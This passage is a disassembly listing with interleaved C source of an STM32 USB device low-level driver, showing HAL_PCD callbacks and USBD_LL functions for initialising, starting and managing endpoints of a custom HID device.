 800c94c:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800c950:	681a      	ldr	r2, [r3, #0]
 800c952:	78fb      	ldrb	r3, [r7, #3]
 800c954:	4619      	mov	r1, r3
 800c956:	f7fe fbaa 	bl	800b0ae <USBD_LL_DataOutStage>
}
 800c95a:	bf00      	nop
 800c95c:	3708      	adds	r7, #8
 800c95e:	46bd      	mov	sp, r7
 800c960:	bd80      	pop	{r7, pc}

0800c962 <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c962:	b580      	push	{r7, lr}
 800c964:	b082      	sub	sp, #8
 800c966:	af00      	add	r7, sp, #0
 800c968:	6078      	str	r0, [r7, #4]
 800c96a:	460b      	mov	r3, r1
 800c96c:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800c96e:	687b      	ldr	r3, [r7, #4]
 800c970:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c974:	78fa      	ldrb	r2, [r7, #3]
 800c976:	6879      	ldr	r1, [r7, #4]
 800c978:	4613      	mov	r3, r2
 800c97a:	009b      	lsls	r3, r3, #2
 800c97c:	4413      	add	r3, r2
 800c97e:	00db      	lsls	r3, r3, #3
 800c980:	440b      	add	r3, r1
 800c982:	333c      	adds	r3, #60	; 0x3c
 800c984:	681a      	ldr	r2, [r3, #0]
 800c986:	78fb      	ldrb	r3, [r7, #3]
 800c988:	4619      	mov	r1, r3
 800c98a:	f7fe fc43 	bl	800b214 <USBD_LL_DataInStage>
}
 800c98e:	bf00      	nop
 800c990:	3708      	adds	r7, #8
 800c992:	46bd      	mov	sp, r7
 800c994:	bd80      	pop	{r7, pc}

0800c996 <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c996:	b580      	push	{r7, lr}
 800c998:	b082      	sub	sp, #8
 800c99a:	af00      	add	r7, sp, #0
 800c99c:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800c99e:	687b      	ldr	r3, [r7, #4]
 800c9a0:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9a4:	4618      	mov	r0, r3
 800c9a6:	f7fe fd7d 	bl	800b4a4 <USBD_LL_SOF>
}
 800c9aa:	bf00      	nop
 800c9ac:	3708      	adds	r7, #8
 800c9ae:	46bd      	mov	sp, r7
 800c9b0:	bd80      	pop	{r7, pc}

0800c9b2 <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c9b2:	b580      	push	{r7, lr}
 800c9b4:	b084      	sub	sp, #16
 800c9b6:	af00      	add	r7, sp, #0
 800c9b8:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800c9ba:	2301      	movs	r3, #1
 800c9bc:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800c9be:	687b      	ldr	r3, [r7, #4]
 800c9c0:	689b      	ldr	r3, [r3, #8]
 800c9c2:	2b02      	cmp	r3, #2
 800c9c4:	d001      	beq.n	800c9ca <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800c9c6:	f7f4 f985 	bl	8000cd4 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800c9ca:	687b      	ldr	r3, [r7, #4]
 800c9cc:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9d0:	7bfa      	ldrb	r2, [r7, #15]
 800c9d2:	4611      	mov	r1, r2
 800c9d4:	4618      	mov	r0, r3
 800c9d6:	f7fe fd21 	bl	800b41c <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800c9da:	687b      	ldr	r3, [r7, #4]
 800c9dc:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9e0:	4618      	mov	r0, r3
 800c9e2:	f7fe fcc9 	bl	800b378 <USBD_LL_Reset>
}
 800c9e6:	bf00      	nop
 800c9e8:	3710      	adds	r7, #16
 800c9ea:	46bd      	mov	sp, r7
 800c9ec:	bd80      	pop	{r7, pc}
	...

0800c9f0 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c9f0:	b580      	push	{r7, lr}
 800c9f2:	b082      	sub	sp, #8
 800c9f4:	af00      	add	r7, sp, #0
 800c9f6:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800c9f8:	687b      	ldr	r3, [r7, #4]
 800c9fa:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9fe:	4618      	mov	r0, r3
 800ca00:	f7fe fd1c 	bl	800b43c <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800ca04:	687b      	ldr	r3, [r7, #4]
 800ca06:	699b      	ldr	r3, [r3, #24]
 800ca08:	2b00      	cmp	r3, #0
 800ca0a:	d005      	beq.n	800ca18 <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800ca0c:	4b04      	ldr	r3, [pc, #16]	; (800ca20 <HAL_PCD_SuspendCallback+0x30>)
 800ca0e:	691b      	ldr	r3, [r3, #16]
 800ca10:	4a03      	ldr	r2, [pc, #12]	; (800ca20 <HAL_PCD_SuspendCallback+0x30>)
 800ca12:	f043 0306 	orr.w	r3, r3, #6
 800ca16:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800ca18:	bf00      	nop
 800ca1a:	3708      	adds	r7, #8
 800ca1c:	46bd      	mov	sp, r7
 800ca1e:	bd80      	pop	{r7, pc}
 800ca20:	e000ed00 	.word	0xe000ed00

0800ca24 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800ca24:	b580      	push	{r7, lr}
 800ca26:	b082      	sub	sp, #8
 800ca28:	af00      	add	r7, sp, #0
 800ca2a:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800ca2c:	687b      	ldr	r3, [r7, #4]
 800ca2e:	699b      	ldr	r3, [r3, #24]
 800ca30:	2b00      	cmp	r3, #0
 800ca32:	d007      	beq.n	800ca44 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800ca34:	4b08      	ldr	r3, [pc, #32]	; (800ca58 <HAL_PCD_ResumeCallback+0x34>)
 800ca36:	691b      	ldr	r3, [r3, #16]
 800ca38:	4a07      	ldr	r2, [pc, #28]	; (800ca58 <HAL_PCD_ResumeCallback+0x34>)
 800ca3a:	f023 0306 	bic.w	r3, r3, #6
 800ca3e:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800ca40:	f000 faf0 	bl	800d024 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800ca44:	687b      	ldr	r3, [r7, #4]
 800ca46:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800ca4a:	4618      	mov	r0, r3
 800ca4c:	f7fe fd12 	bl	800b474 <USBD_LL_Resume>
}
 800ca50:	bf00      	nop
 800ca52:	3708      	adds	r7, #8
 800ca54:	46bd      	mov	sp, r7
 800ca56:	bd80      	pop	{r7, pc}
 800ca58:	e000ed00 	.word	0xe000ed00

0800ca5c <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800ca5c:	b580      	push	{r7, lr}
 800ca5e:	b082      	sub	sp, #8
 800ca60:	af00      	add	r7, sp, #0
 800ca62:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800ca64:	f7f6 ff42 	bl	80038ec <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800ca68:	4a26      	ldr	r2, [pc, #152]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca6a:	687b      	ldr	r3, [r7, #4]
 800ca6c:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800ca70:	687b      	ldr	r3, [r7, #4]
 800ca72:	4a24      	ldr	r2, [pc, #144]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca74:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800ca78:	4b22      	ldr	r3, [pc, #136]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca7a:	4a23      	ldr	r2, [pc, #140]	; (800cb08 <USBD_LL_Init+0xac>)
 800ca7c:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800ca7e:	4b21      	ldr	r3, [pc, #132]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca80:	2208      	movs	r2, #8
 800ca82:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800ca84:	4b1f      	ldr	r3, [pc, #124]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca86:	2202      	movs	r2, #2
 800ca88:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800ca8a:	4b1e      	ldr	r3, [pc, #120]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca8c:	2202      	movs	r2, #2
 800ca8e:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800ca90:	4b1c      	ldr	r3, [pc, #112]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca92:	2200      	movs	r2, #0
 800ca94:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800ca96:	4b1b      	ldr	r3, [pc, #108]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca98:	2200      	movs	r2, #0
 800ca9a:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800ca9c:	4b19      	ldr	r3, [pc, #100]	; (800cb04 <USBD_LL_Init+0xa8>)
 800ca9e:	2200      	movs	r2, #0
 800caa0:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800caa2:	4b18      	ldr	r3, [pc, #96]	; (800cb04 <USBD_LL_Init+0xa8>)
 800caa4:	2200      	movs	r2, #0
 800caa6:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800caa8:	4816      	ldr	r0, [pc, #88]	; (800cb04 <USBD_LL_Init+0xa8>)
 800caaa:	f7f5 f8e7 	bl	8001c7c <HAL_PCD_Init>
 800caae:	4603      	mov	r3, r0
 800cab0:	2b00      	cmp	r3, #0
 800cab2:	d001      	beq.n	800cab8 <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800cab4:	f7f4 f90e 	bl	8000cd4 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800cab8:	687b      	ldr	r3, [r7, #4]
 800caba:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cabe:	2318      	movs	r3, #24
 800cac0:	2200      	movs	r2, #0
 800cac2:	2100      	movs	r1, #0
 800cac4:	f7f6 fe31 	bl	800372a <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800cac8:	687b      	ldr	r3, [r7, #4]
 800caca:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cace:	2358      	movs	r3, #88	; 0x58
 800cad0:	2200      	movs	r2, #0
 800cad2:	2180      	movs	r1, #128	; 0x80
 800cad4:	f7f6 fe29 	bl	800372a <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800cad8:	687b      	ldr	r3, [r7, #4]
 800cada:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cade:	2398      	movs	r3, #152	; 0x98
 800cae0:	2200      	movs	r2, #0
 800cae2:	2181      	movs	r1, #129	; 0x81
 800cae4:	f7f6 fe21 	bl	800372a <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800cae8:	687b      	ldr	r3, [r7, #4]
 800caea:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800caee:	23d8      	movs	r3, #216	; 0xd8
 800caf0:	2200      	movs	r2, #0
 800caf2:	2101      	movs	r1, #1
 800caf4:	f7f6 fe19 	bl	800372a <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800caf8:	2300      	movs	r3, #0
}
 800cafa:	4618      	mov	r0, r3
 800cafc:	3708      	adds	r7, #8
 800cafe:	46bd      	mov	sp, r7
 800cb00:	bd80      	pop	{r7, pc}
 800cb02:	bf00      	nop
 800cb04:	20000b7c 	.word	0x20000b7c
 800cb08:	40006800 	.word	0x40006800

0800cb0c <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800cb0c:	b580      	push	{r7, lr}
 800cb0e:	b084      	sub	sp, #16
 800cb10:	af00      	add	r7, sp, #0
 800cb12:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb14:	2300      	movs	r3, #0
 800cb16:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb18:	2300      	movs	r3, #0
 800cb1a:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800cb1c:	687b      	ldr	r3, [r7, #4]
 800cb1e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cb22:	4618      	mov	r0, r3
 800cb24:	f7f5 f9b0 	bl	8001e88 <HAL_PCD_Start>
 800cb28:	4603      	mov	r3, r0
 800cb2a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb2c:	7bbb      	ldrb	r3, [r7, #14]
 800cb2e:	2b03      	cmp	r3, #3
 800cb30:	d816      	bhi.n	800cb60 <USBD_LL_Start+0x54>
 800cb32:	a201      	add	r2, pc, #4	; (adr r2, 800cb38 <USBD_LL_Start+0x2c>)
 800cb34:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb38:	0800cb49 	.word	0x0800cb49
 800cb3c:	0800cb4f 	.word	0x0800cb4f
 800cb40:	0800cb55 	.word	0x0800cb55
 800cb44:	0800cb5b 	.word	0x0800cb5b
    case HAL_OK :
      usb_status = USBD_OK;
 800cb48:	2300      	movs	r3, #0
 800cb4a:	73fb      	strb	r3, [r7, #15]
    break;
 800cb4c:	e00b      	b.n	800cb66 <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cb4e:	2303      	movs	r3, #3
 800cb50:	73fb      	strb	r3, [r7, #15]
    break;
 800cb52:	e008      	b.n	800cb66 <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cb54:	2301      	movs	r3, #1
 800cb56:	73fb      	strb	r3, [r7, #15]
    break;
 800cb58:	e005      	b.n	800cb66 <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cb5a:	2303      	movs	r3, #3
 800cb5c:	73fb      	strb	r3, [r7, #15]
    break;
 800cb5e:	e002      	b.n	800cb66 <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800cb60:	2303      	movs	r3, #3
 800cb62:	73fb      	strb	r3, [r7, #15]
    break;
 800cb64:	bf00      	nop
  }
  return usb_status;
 800cb66:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb68:	4618      	mov	r0, r3
 800cb6a:	3710      	adds	r7, #16
 800cb6c:	46bd      	mov	sp, r7
 800cb6e:	bd80      	pop	{r7, pc}

0800cb70 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800cb70:	b580      	push	{r7, lr}
 800cb72:	b084      	sub	sp, #16
 800cb74:	af00      	add	r7, sp, #0
 800cb76:	6078      	str	r0, [r7, #4]
 800cb78:	4608      	mov	r0, r1
 800cb7a:	4611      	mov	r1, r2
 800cb7c:	461a      	mov	r2, r3
 800cb7e:	4603      	mov	r3, r0
 800cb80:	70fb      	strb	r3, [r7, #3]
 800cb82:	460b      	mov	r3, r1
 800cb84:	70bb      	strb	r3, [r7, #2]
 800cb86:	4613      	mov	r3, r2
 800cb88:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb8a:	2300      	movs	r3, #0
 800cb8c:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb8e:	2300      	movs	r3, #0
 800cb90:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cb92:	687b      	ldr	r3, [r7, #4]
 800cb94:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cb98:	78bb      	ldrb	r3, [r7, #2]
 800cb9a:	883a      	ldrh	r2, [r7, #0]
 800cb9c:	78f9      	ldrb	r1, [r7, #3]
 800cb9e:	f7f5 fae1 	bl	8002164 <HAL_PCD_EP_Open>
 800cba2:	4603      	mov	r3, r0
 800cba4:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cba6:	7bbb      	ldrb	r3, [r7, #14]
 800cba8:	2b03      	cmp	r3, #3
 800cbaa:	d817      	bhi.n	800cbdc <USBD_LL_OpenEP+0x6c>
 800cbac:	a201      	add	r2, pc, #4	; (adr r2, 800cbb4 <USBD_LL_OpenEP+0x44>)
 800cbae:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cbb2:	bf00      	nop
 800cbb4:	0800cbc5 	.word	0x0800cbc5
 800cbb8:	0800cbcb 	.word	0x0800cbcb
 800cbbc:	0800cbd1 	.word	0x0800cbd1
 800cbc0:	0800cbd7 	.word	0x0800cbd7
    case HAL_OK :
      usb_status = USBD_OK;
 800cbc4:	2300      	movs	r3, #0
 800cbc6:	73fb      	strb	r3, [r7, #15]
    break;
 800cbc8:	e00b      	b.n	800cbe2 <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cbca:	2303      	movs	r3, #3
 800cbcc:	73fb      	strb	r3, [r7, #15]
    break;
 800cbce:	e008      	b.n	800cbe2 <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cbd0:	2301      	movs	r3, #1
 800cbd2:	73fb      	strb	r3, [r7, #15]
    break;
 800cbd4:	e005      	b.n	800cbe2 <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cbd6:	2303      	movs	r3, #3
 800cbd8:	73fb      	strb	r3, [r7, #15]
    break;
 800cbda:	e002      	b.n	800cbe2 <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cbdc:	2303      	movs	r3, #3
 800cbde:	73fb      	strb	r3, [r7, #15]
    break;
 800cbe0:	bf00      	nop
  }
  return usb_status;
 800cbe2:	7bfb      	ldrb	r3, [r7, #15]
}
 800cbe4:	4618      	mov	r0, r3
 800cbe6:	3710      	adds	r7, #16
 800cbe8:	46bd      	mov	sp, r7
 800cbea:	bd80      	pop	{r7, pc}

0800cbec <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cbec:	b580      	push	{r7, lr}
 800cbee:	b084      	sub	sp, #16
 800cbf0:	af00      	add	r7, sp, #0
 800cbf2:	6078      	str	r0, [r7, #4]
 800cbf4:	460b      	mov	r3, r1
 800cbf6:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cbf8:	2300      	movs	r3, #0
 800cbfa:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cbfc:	2300      	movs	r3, #0
 800cbfe:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cc00:	687b      	ldr	r3, [r7, #4]
 800cc02:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc06:	78fa      	ldrb	r2, [r7, #3]
 800cc08:	4611      	mov	r1, r2
 800cc0a:	4618      	mov	r0, r3
 800cc0c:	f7f5 fb07 	bl	800221e <HAL_PCD_EP_Close>
 800cc10:	4603      	mov	r3, r0
 800cc12:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc14:	7bbb      	ldrb	r3, [r7, #14]
 800cc16:	2b03      	cmp	r3, #3
 800cc18:	d816      	bhi.n	800cc48 <USBD_LL_CloseEP+0x5c>
 800cc1a:	a201      	add	r2, pc, #4	; (adr r2, 800cc20 <USBD_LL_CloseEP+0x34>)
 800cc1c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc20:	0800cc31 	.word	0x0800cc31
 800cc24:	0800cc37 	.word	0x0800cc37
 800cc28:	0800cc3d 	.word	0x0800cc3d
 800cc2c:	0800cc43 	.word	0x0800cc43
    case HAL_OK :
      usb_status = USBD_OK;
 800cc30:	2300      	movs	r3, #0
 800cc32:	73fb      	strb	r3, [r7, #15]
    break;
 800cc34:	e00b      	b.n	800cc4e <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc36:	2303      	movs	r3, #3
 800cc38:	73fb      	strb	r3, [r7, #15]
    break;
 800cc3a:	e008      	b.n	800cc4e <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc3c:	2301      	movs	r3, #1
 800cc3e:	73fb      	strb	r3, [r7, #15]
    break;
 800cc40:	e005      	b.n	800cc4e <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc42:	2303      	movs	r3, #3
 800cc44:	73fb      	strb	r3, [r7, #15]
    break;
 800cc46:	e002      	b.n	800cc4e <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc48:	2303      	movs	r3, #3
 800cc4a:	73fb      	strb	r3, [r7, #15]
    break;
 800cc4c:	bf00      	nop
  }
  return usb_status;
 800cc4e:	7bfb      	ldrb	r3, [r7, #15]
}
 800cc50:	4618      	mov	r0, r3
 800cc52:	3710      	adds	r7, #16
 800cc54:	46bd      	mov	sp, r7
 800cc56:	bd80      	pop	{r7, pc}

0800cc58 <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cc58:	b580      	push	{r7, lr}
 800cc5a:	b084      	sub	sp, #16
 800cc5c:	af00      	add	r7, sp, #0
 800cc5e:	6078      	str	r0, [r7, #4]
 800cc60:	460b      	mov	r3, r1
 800cc62:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc64:	2300      	movs	r3, #0
 800cc66:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc68:	2300      	movs	r3, #0
 800cc6a:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cc6c:	687b      	ldr	r3, [r7, #4]
 800cc6e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc72:	78fa      	ldrb	r2, [r7, #3]
 800cc74:	4611      	mov	r1, r2
 800cc76:	4618      	mov	r0, r3
 800cc78:	f7f5 fc66 	bl	8002548 <HAL_PCD_EP_Flush>
 800cc7c:	4603      	mov	r3, r0
 800cc7e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc80:	7bbb      	ldrb	r3, [r7, #14]
 800cc82:	2b03      	cmp	r3, #3
 800cc84:	d816      	bhi.n	800ccb4 <USBD_LL_FlushEP+0x5c>
 800cc86:	a201      	add	r2, pc, #4	; (adr r2, 800cc8c <USBD_LL_FlushEP+0x34>)
 800cc88:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc8c:	0800cc9d 	.word	0x0800cc9d
 800cc90:	0800cca3 	.word	0x0800cca3
 800cc94:	0800cca9 	.word	0x0800cca9
 800cc98:	0800ccaf 	.word	0x0800ccaf
    case HAL_OK :
      usb_status = USBD_OK;
 800cc9c:	2300      	movs	r3, #0
 800cc9e:	73fb      	strb	r3, [r7, #15]
    break;
 800cca0:	e00b      	b.n	800ccba <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cca2:	2303      	movs	r3, #3
 800cca4:	73fb      	strb	r3, [r7, #15]
    break;
 800cca6:	e008      	b.n	800ccba <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cca8:	2301      	movs	r3, #1
 800ccaa:	73fb      	strb	r3, [r7, #15]
    break;
 800ccac:	e005      	b.n	800ccba <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ccae:	2303      	movs	r3, #3
 800ccb0:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb2:	e002      	b.n	800ccba <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ccb4:	2303      	movs	r3, #3
 800ccb6:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb8:	bf00      	nop
  }
  return usb_status;
 800ccba:	7bfb      	ldrb	r3, [r7, #15]
}
 800ccbc:	4618      	mov	r0, r3
 800ccbe:	3710      	adds	r7, #16
 800ccc0:	46bd      	mov	sp, r7
 800ccc2:	bd80      	pop	{r7, pc}

0800ccc4 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ccc4:	b580      	push	{r7, lr}
 800ccc6:	b084      	sub	sp, #16
 800ccc8:	af00      	add	r7, sp, #0
 800ccca:	6078      	str	r0, [r7, #4]
 800cccc:	460b      	mov	r3, r1
 800ccce:	70fb      	strb	r3, [r7, #3]
